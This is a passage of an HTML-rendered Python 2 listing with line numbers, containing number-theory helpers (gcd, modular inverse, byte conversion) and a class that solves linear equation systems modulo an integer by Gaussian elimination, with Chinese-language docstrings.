class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Author @55-AA</span></span><br><span class="line"><span class="string">19 July, 2016</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Return the greatest common denominator of integers a and b.</span></span><br><span class="line"><span class="string">    gmpy2.gcd(a, b)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lcm</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a * b / (gcd(a, b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ax + by = 1</span></span><br><span class="line"><span class="string">    ax ≡ 1 mod b</span></span><br><span class="line"><span class="string">    Return a 3-element tuple (g, x, y), the g  = gcd(a, b)</span></span><br><span class="line"><span class="string">    gmpy2.gcdext(a, b)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_inv</span>(<span class="params">a, m</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ax ≡ 1 mod m</span></span><br><span class="line"><span class="string">    gmpy2.invert(a, m)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">assert</span> g == <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2mem</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    0x12233 =&gt; &#x27;\x33\x22\x01&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pad_even = <span class="keyword">lambda</span> x: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)[<span class="built_in">len</span>(x) % <span class="number">2</span>] + x</span><br><span class="line">    x = <span class="built_in">list</span>(pad_even(<span class="built_in">format</span>(x, <span class="string">&#x27;x&#x27;</span>)).decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    x.reverse()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mem2int</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#x27;\x33\x22\x01&#x27; =&gt; 0x12233</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    x = <span class="built_in">list</span>(x)</span><br><span class="line">    x.reverse()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(x).encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">###########################################################</span></span><br><span class="line"><span class="comment"># class</span></span><br><span class="line"><span class="comment">###########################################################</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GaussMatrix</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    A*X ≡ B (mod p),p为大于0的整数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    高斯消元求解模线性方程组。先化简为上三角，然后回代求解。</span></span><br><span class="line"><span class="string">    当r(A) &lt;= n时，一定有多解；</span></span><br><span class="line"><span class="string">    当r(A) == n时，有多解或唯一解；</span></span><br><span class="line"><span class="string">    当r(A) != r(A~)时，无解。</span></span><br><span class="line"><span class="string">    r(A)为系数矩阵的秩，r(A)为增广矩阵的秩，n为未知数的个数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    http://www.docin.com/p-1063811671.html讨论了gcd(|A|, m) = 1时的LU分解解法，</span></span><br><span class="line"><span class="string">    本文包括了gcd(|A|, m) &gt; 1时的解法，</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    化简原则：</span></span><br><span class="line"><span class="string">        1、系数与模互质</span></span><br><span class="line"><span class="string">        2、系数加某一行n次后，对应的系数与模的GCD最小</span></span><br><span class="line"><span class="string">        3、将1或2得到的系数移到对角线上</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    初始化参数：</span></span><br><span class="line"><span class="string">        matrix：方程组的增广矩阵（最后一列为常数项）。</span></span><br><span class="line"><span class="string">            matrix = [</span></span><br><span class="line"><span class="string">                [ 69,  75,  78,  36,  58],</span></span><br><span class="line"><span class="string">                [ 46,  68,  51,  26,  42],</span></span><br><span class="line"><span class="string">                [ 76,  40,  42,  49,  11],</span></span><br><span class="line"><span class="string">                [ 11,  45,   2,  45,   1],</span></span><br><span class="line"><span class="string">                [ 15,  67,  60,  14,  72],</span></span><br><span class="line"><span class="string">                [ 76,  67,  73,  56,  58],</span></span><br><span class="line"><span class="string">                [ 67,  15,  68,  54,  75],</span></span><br><span class="line"><span class="string">            ]    </span></span><br><span class="line"><span class="string">        mod：模数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    函数：</span></span><br><span class="line"><span class="string">        gauss()：求解方程</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    输出变量：</span></span><br><span class="line"><span class="string">        error_str：出错的信息</span></span><br><span class="line"><span class="string">        count：解的数量</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, matrix, mod</span>):</span></span><br><span class="line">        self.matrix = copy.deepcopy(matrix)</span><br><span class="line">        self.d = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        self.r = <span class="built_in">len</span>(matrix)</span><br><span class="line">        self.c = <span class="built_in">len</span>(matrix[<span class="number">0</span>])</span><br><span class="line">        self.N = <span class="built_in">len</span>(matrix[<span class="number">0</span>]) - <span class="number">1</span></span><br><span class="line">        self.mod = mod</span><br><span class="line">        self.count = <span class="number">1</span></span><br><span class="line">        self.error_str = <span class="string">&quot;unknown error&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify_solution</span>(<span class="params">self, solution</span>):</span></span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> self.matrix:</span><br><span class="line">            result = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: <span class="number">0</span> <span class="keyword">if</span> <span class="literal">None</span> == y <span class="keyword">else</span> x * y, d, solution):</span><br><span class="line">                result += r</span><br><span class="line">            <span class="keyword">if</span> (result % self.mod) != ((d[-<span class="number">1</span>]) % self.mod):</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">swap_row</span>(<span class="params">self, ra, rb</span>):</span></span><br><span class="line">        (self.d[ra], self.d[rb]) = (self.d[rb], self.d[ra])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">swap_col</span>(<span class="params">self, ca, cb</span>):</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.r):</span><br><span class="line">            (self.d[j][ca], self.d[j][cb]) = (self.d[j][cb], self.d[j][ca])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inv_result</span>(<span class="params">self, r, n</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        求解第n个未知数，r已经获得的解。形如：[None,None, ..., n+1, ...]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        a*x ≡ b(mod m)</span></span><br><span class="line"><span class="string">        x有解的条件：gcd(a,m) | b。也即a,m互质时一定有解，不互质时，b整除gcd(a,m)也有解，否则无解。</span></span><br><span class="line"><span class="string">        解的格式为：x0+k(m/gcd(a,m))，其中x0为最小整数特解，k为任意整数。</span></span><br><span class="line"><span class="string">        返回[x0, x1, ...xn]，其中x0 &lt; x1 &lt; xn &lt; m。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        b = self.d[n][self.N]</span><br><span class="line">        a = self.d[n][n]</span><br><span class="line">        m = self.mod</span><br><span class="line">        k = gcd(a, m)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(n + <span class="number">1</span>, self.N):</span><br><span class="line">            b = (b - (self.d[n][j] * r[j] % m)) % m</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> == k:</span><br><span class="line">            <span class="keyword">return</span> [mod_inv(a, m) * b % m]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> k == gcd(k, b):</span><br><span class="line">                a /= k</span><br><span class="line">                b /= k</span><br><span class="line">                m /= k</span><br><span class="line"></span><br><span class="line">                x0 = mod_inv(a, m) * b % m</span><br><span class="line">                x = []</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> xrange(k):</span><br><span class="line">                    x.append(x0 + m * i)</span><br><span class="line">                <span class="keyword">return</span> x</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_min_gcd_row_col</span>(<span class="params">self, i, j</span>):</span></span><br><span class="line">        <span class="comment"># 查找直接互质的对角线系数</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> xrange(i, self.r):</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> xrange(j, self.c - <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">1</span> == gcd(self.d[k][l], self.mod)):</span><br><span class="line">                    <span class="keyword">return</span> [k, l]</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">add_min_gcd</span>(<span class="params">a, b, m</span>):</span></span><br><span class="line">            r = [m, <span class="number">1</span>]</span><br><span class="line">            g = gcd(a, b)</span><br><span class="line">            <span class="keyword">if</span> g:</span><br><span class="line">                i = a / g</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> xrange(i):</span><br><span class="line">                    g = gcd((a + j * b) % m, m)</span><br><span class="line">                    <span class="keyword">if</span> g &lt; r[<span class="number">0</span>]:</span><br><span class="line">                        r[<span class="number">0</span>] = g</span><br><span class="line">                        r[<span class="number">1</span>] = j</span><br><span class="line">                    <span class="keyword">if</span> g == <span class="number">1</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 查找加乘后GCD最小的对角线系数</span></span><br><span class="line">        <span class="comment">#   [加乘后的最大公约数,加乘的倍数,要化简的行号,加乘的行号,要化简的列号]</span></span><br><span class="line">        r = [self.mod, <span class="number">1</span>, i, i + <span class="number">1</span>, j]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> xrange(i, self.r):</span><br><span class="line">            <span class="keyword">for</span> kk <span class="keyword">in</span> xrange(k + <span class="number">1</span>, self.r):</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(j, self.c - <span class="number">1</span>):</span><br><span class="line">                    rr = add_min_gcd(self.d[k][l], self.d[kk][l], self.mod)</span><br><span class="line">                    <span class="keyword">if</span> rr[<span class="number">0</span>] &lt; r[<span class="number">0</span>]:</span><br><span class="line">                        r[<span class="number">0</span>] = rr[<span class="number">0</span>]</span><br><span class="line">                        r[<span class="number">1</span>] = rr[<span class="number">1</span>]</span><br><span class="line">                        r[<span class="number">2</span>] = k</span><br><span class="line">                        r[<span class="number">3</span>] = kk</span><br><span class="line">                        r[<span class="number">4</span>] = l</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="number">1</span> == rr[<span class="number">0</span>]):</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">        g = r[<span class="number">0</span>]</span><br><span class="line">        n = r[<span class="number">1</span>]</span><br><span class="line">        k = r[<span class="number">2</span>]</span><br><span class="line">        kk = r[<span class="number">3</span>]</span><br><span class="line">        l = r[<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> n <span class="keyword">and</span> g &lt; self.mod:</span><br><span class="line">            self.d[k] = <span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: (x + n * y) % self.mod, self.d[k], self.d[kk])</span><br><span class="line">        <span class="keyword">return</span> [k, l]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mul_row</span>(<span class="params">self, i, k, j</span>):</span></span><br><span class="line">        a = self.d[k][j]</span><br><span class="line">        b = self.d[i][j]</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">get_mul</span>(<span class="params">a, b, m</span>):</span></span><br><span class="line">            k = gcd(a, m)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">1</span> == k:</span><br><span class="line">                <span class="keyword">return</span> mod_inv(a, m) * b % m</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> k == gcd(k, b):</span><br><span class="line">                    <span class="keyword">return</span> mod_inv(a / k, m / k) * (b / k) % (m / k)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> b:</span><br><span class="line">            mul = get_mul(a, b, self.mod)</span><br><span class="line">            <span class="keyword">if</span> <span class="literal">None</span> == mul:</span><br><span class="line">                print_matrix(self.d)</span><br><span class="line">                <span class="keyword">assert</span> (mul != <span class="literal">None</span>)</span><br><span class="line">            self.d[i] = <span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: (y - x * mul) % self.mod, self.d[k], self.d[i])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gauss</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        返回解向量，唯一解、多解或无解(None)。</span></span><br><span class="line"><span class="string">        例如：[[61, 25, 116, 164], [61, 60, 116, 94], [61, 95, 116, 24], [61, 130, 116, 129], [61, 165, 116, 59]]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        self.d = copy.deepcopy(self.matrix)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(self.r):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> xrange(self.c):</span><br><span class="line">                self.d[i][j] = self.matrix[i][j] % self.mod  <span class="comment"># 把负系数变成正系数</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.r &lt; self.N:</span><br><span class="line">            self.d.extend([[<span class="number">0</span>] * self.c] * (self.N - self.r))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 化简上三角</span></span><br><span class="line">        index = [x <span class="keyword">for</span> x <span class="keyword">in</span> xrange(self.N)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.N):</span><br><span class="line">            tmp = self.find_min_gcd_row_col(i, i)</span><br><span class="line">            <span class="keyword">if</span> (tmp):</span><br><span class="line">                self.swap_row(i, tmp[<span class="number">0</span>])</span><br><span class="line">                (index[i], index[tmp[<span class="number">1</span>]]) = (index[tmp[<span class="number">1</span>]], index[i])</span><br><span class="line">                self.swap_col(i, tmp[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.error_str = <span class="string">&quot;no min&quot;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, self.r):</span><br><span class="line">                self.mul_row(k, i, i)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print_matrix(self.d)</span></span><br><span class="line">        <span class="keyword">if</span> self.r &gt; self.N:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(self.N, self.r):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> xrange(self.c):</span><br><span class="line">                    <span class="keyword">if</span> self.d[i][j]:</span><br><span class="line">                        self.error_str = <span class="string">&quot;r(A) != r(A~)&quot;</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 判断解的数量</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(self.N):</span><br><span class="line">            self.count *= gcd(self.d[i][i], self.mod)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.count &gt; <span class="number">100</span>:</span><br><span class="line">            self.error_str = <span class="string">&quot;solution too more:%d&quot;</span> % (self.count)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 回代</span></span><br><span class="line">        result = [[<span class="literal">None</span>] * self.N]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.N - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            new_result = []</span><br><span class="line">            <span class="keyword">for</span> r <span class="keyword">in</span> result:</span><br><span class="line">                ret = self.inv_result(r, i)</span><br><span class="line">                <span class="keyword">if</span> ret:</span><br><span class="line">                    <span class="keyword">for</span> rr <span class="keyword">in</span> ret:</span><br><span class="line">                        l = r[:]</span><br><span class="line">                        l[i] = rr</span><br><span class="line">                        new_result.append(l)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.error_str = <span class="string">&quot;no inv:i=%d&quot;</span> % (i)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            result = new_result</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 调整列变换导致的未知数顺序变化</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(result)):</span><br><span class="line">            <span class="function"><span class="keyword">def</span> <span class="title">xchg</span>(<span class="params">a, b</span>):</span></span><br><span class="line">                result[i][b] = a</span><br><span class="line"></span><br><span class="line">            <span class="built_in">map</span>(xchg, result[i][:], index)</span><br><span class="line"></span><br><span class="line">        <span 